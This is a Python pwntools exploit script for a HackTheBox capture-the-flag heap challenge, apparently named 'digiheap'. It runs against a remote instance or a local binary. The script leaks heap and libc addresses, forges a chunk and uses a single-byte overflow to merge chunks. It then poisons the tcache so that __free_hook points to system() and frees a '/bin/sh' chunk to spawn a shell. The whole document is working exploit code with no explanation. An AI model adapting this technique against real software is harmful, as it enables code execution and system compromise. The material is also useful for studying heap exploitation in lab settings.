#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'docker.hackthebox.eu', 30692
binary = './digimod'
brkpts = '''
'''

elf = ELF("digiheap")
libc = ELF("libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
#context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

if len(sys.argv) > 1:
    io = remote(remote_ip, port)

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc.so.6'})

def choice(idx):
    sla(">> ", str(idx))

def add(idx, description = None, size = 0, val = 1):
    choice(1)
    sla("index: ", str(idx))
    for i in range(4):
        sla("value: ", str(val))
    if description is not None:
        sla("(Y/N): ", "Y")
        sla("Size: ", str(size))
        sa("description: ", description)
    else:
        sla("(Y/N): ", "N")

def edit(idx, description):
    choice(2)
    sla("index: ", str(idx))
    sa("description: ", description)

def delete(idx):
    choice(3)
    sla("index: ", str(idx))

def show(idx):
    choice(4)
    sla("index: ", str(idx))

if __name__ == "__main__":
    add(0, "a"*8, 0x68)
    add(1, "b"*8, 0x68)
    delete(1)
    delete(0)
    add(0, "a", 0x68)
    show(0)
    reu("Description: a")
    heap = u64(("\x00" + re(2)).ljust(8,"\x00")) - 0x1300
    log.info("Heap : "+hex(heap))
    
    delete(0)
    add(0, "temp", 0x500)
    add(1, "temp", 0x10)
    delete(0)
    add(0, "a", 0x500)
    show(0)
    reu("Description: a")
    libc.address = u64(("\x00" + re(5)).ljust(8,"\x00")) - 0x1e4c00
    log.info("Libc : "+hex(libc.address))
    system = libc.symbols['system']
    free_hook = libc.symbols['__free_hook']

    delete(0)
    delete(1)
    add(0, "useless", 0x400)
    fake = p64(0)
    fake += p64(0x325)
    fake += p64(heap + 0x18c0)
    fake += p64(heap + 0x18c0)
    add(1, fake, 0x108)
    add(2, "temp", 0x108)
    add(3, "temp", 0x108)
    add(4, "overflow", 0x4f8)
    add(5, "temp", 0x108)
    add(6, "/bin/sh\x00", 0x28)
    payload = "a"*0x100 + p64(0x320)
    edit(3, payload)
    delete(4)
    delete(5)
    delete(2)
    payload = "a"*0xf8
    payload += p64(0x111)
    payload += p64(free_hook)
    add(2, payload, 0x200)
    add(4, p64(system), 0x108)
    add(5, p64(system), 0x108)
    gdb.attach(io)
    delete(6)
    io.interactive()
